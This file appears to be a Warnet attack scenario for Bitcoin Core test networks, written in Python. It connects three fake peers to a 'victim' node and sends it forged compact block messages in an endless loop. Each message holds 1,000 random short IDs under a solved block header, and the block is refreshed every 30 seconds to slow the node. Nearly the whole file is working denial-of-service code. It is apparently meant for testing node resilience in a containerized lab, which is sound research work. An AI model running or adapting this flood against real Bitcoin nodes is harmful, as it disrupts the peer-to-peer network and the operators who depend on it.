#!/usr/bin/env python3

import random
import socket
from datetime import (
    datetime,
    timedelta,
)

from commander import Commander

from test_framework.blocktools import (
    create_block,
    NORMAL_GBT_REQUEST_PARAMS
)

# The entire Bitcoin Core test_framework directory is available as a library
from test_framework.messages import (
    CBlockHeader,
    P2PHeaderAndShortIDs,
    msg_cmpctblock,

)
from test_framework.p2p import (
    P2PInterface,
)

# The actual scenario is a class like a Bitcoin Core functional test.
# Commander is a subclass of BitcoinTestFramework instide Warnet
# that allows to operate on containerized nodes instead of local nodes.

class CmpctAtk(Commander):
    def set_test_params(self):
        # This setting is ignored but still required as
        # a sub-class of BitcoinTestFramework
        self.num_nodes = 0

    def add_options(self, parser):
        parser.description = (
            "CMPCT BLOCKS THEY SLOW"
        )
        parser.usage = "warnet run scenarios/cmpctatk.py"

    def build_block_on_tip(self, node):
        block = create_block(tmpl=node.getblocktemplate(NORMAL_GBT_REQUEST_PARAMS))
        block.solve()
        return block

    def build_fat_empty_cmpct(self, node):
        block = self.build_block_on_tip(node)
        cmpct_block = P2PHeaderAndShortIDs()
        cmpct_block.header = CBlockHeader(block)

        for i in range(1_000):
            shortid = int.from_bytes(random.randbytes(6), byteorder='little')
            cmpct_block.shortids.append(shortid)

        return cmpct_block

    def run_test(self):
        victim = "tank1"

        # regtest or signet
        chain = self.nodes[0].chain

        # The victim's address could be an explicit IP address
        # OR a kubernetes hostname (use default chain p2p port)
        dstaddr = socket.gethostbyname(victim)
        if chain == "regtest":
            dstport = 18444

        # Now we will use a python-based Bitcoin p2p node to send very specific,
        # unusual or non-standard messages to a "victim" node.
        self.log.info(f"Attacking {victim}")
        attackers = []
        for i in range(3):
            attacker = P2PInterface()
            attacker.peer_connect(
                dstaddr=dstaddr, dstport=dstport, net="regtest", timeout_factor=1
            )()
            attacker.wait_until(lambda: attacker.is_connected, check_connected=False)
            attackers.append(attacker)

        attack_block = self.build_fat_empty_cmpct(self.nodes[0])
        attack_block_msg = msg_cmpctblock(attack_block)
        next_block_interrupt_time = datetime.now() + timedelta(seconds=30)
        while True:
            now = datetime.now()
            if now > next_block_interrupt_time:
                attack_block = self.build_fat_empty_cmpct(self.nodes[0])
                attack_block_msg = msg_cmpctblock(attack_block)
                next_block_interrupt_time = datetime.now() + timedelta(seconds=30)

            for attacker in attackers:
                attacker.send_message(attack_block_msg)

def main():
    CmpctAtk().main()


if __name__ == "__main__":
    main()
